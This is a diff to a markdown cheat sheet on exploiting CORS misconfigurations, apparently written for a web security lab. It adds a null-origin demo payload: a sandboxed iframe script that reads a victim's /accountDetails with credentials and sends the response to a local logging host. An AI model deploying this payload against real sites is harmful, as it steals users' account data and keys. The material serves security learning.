@@ -31,11 +31,33 @@ Access-Control-Allow-Credentials: true
         </script>
     </body>
 </html>
-2. Change Origin Header to null.
 ```
+2. Change Origin Header to null.
 GET /sensitive-victim-data HTTP/1.1
 Host: vulnerable-website.com
 Origin: null
+
+**Demo Payload For Basic Case**
+```javascript
+<html>
+    <body>
+        <iframe style="display: none;" sandbox="allow-scripts" srcdoc="
+        <script>
+            var xhr = new XMLHttpRequest();
+            var url = 'https://ac371f531f693ef3c07b84de00630017.web-security-academy.net'
+
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == XMLHttpRequest.DONE) {
+                    fetch('http://127.0.0.1:5555/log?key=' + xhr.responseText)
+                }
+            }
+
+            xhr.open('GET', url + '/accountDetails', true);
+            xhr.withCredentials = true;
+            xhr.send(null);
+        </script>"></iframe>
+    </body>
+</html>
 ```
 3. Change the origin header to one that begins with the origin of the site.
 ```
